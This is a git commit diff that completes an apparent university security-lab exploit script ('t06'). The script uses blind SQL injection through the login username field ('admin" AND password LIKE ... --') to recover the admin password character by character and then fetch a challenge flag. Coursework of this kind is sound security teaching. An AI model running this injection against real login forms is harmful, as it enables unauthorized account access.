de20dd89af6a786f767568359ddb4fa600582272
yorick <78358953+YSchilling@users.noreply.github.com>
2025-10-20 16:01:29 +0200

    finished t06

--- t06/pwn_students.py
+++ t06/pwn_students.py
@@ -1,7 +1,13 @@
 import re
 import requests
 
-URL = "{{CHALLENGE_URL}}"
+# 1. durchgehen bis password gefunden
+# 2. jeden einzelnen character probieren
+# 3. sobald richtigen gefunden, direkt zum nächsten
+# 4. wenn alle chars durch und keiner mehr passt abbrechen
+
+URL = "https://t06-49ff47ac57d4b03c.itsec.sec.in.tum.de/"
+CHARS = "0123456789abcdef"
 
 # Returns only the flag if there is one in the passed string, otherwise returns None
 def extract_flag_from_string(string):
@@ -12,5 +18,22 @@ def extract_flag_from_string(string):
     return None
 
 with requests.Session() as sess:
-    # TODO implement exploit
-    pass
+    password = ""
+    running = True
+    while running:
+        for c in CHARS:
+            data = {"username": 'admin" AND password LIKE "{}%" --'.format(password + c), "password": password + c}
+            response = sess.post(URL, data=data)
+
+            # Check if select returned a row
+            if re.search(r' I20 ', response.text):
+                password = password + c
+                break
+        else:
+            data = {"username": "admin","password": password}
+            response = sess.post(URL, data=data)
+            flag = extract_flag_from_string(response.text)
+            
+            if flag: print(flag)
+            else: print("No flag found! Change character set.")
+            running = False
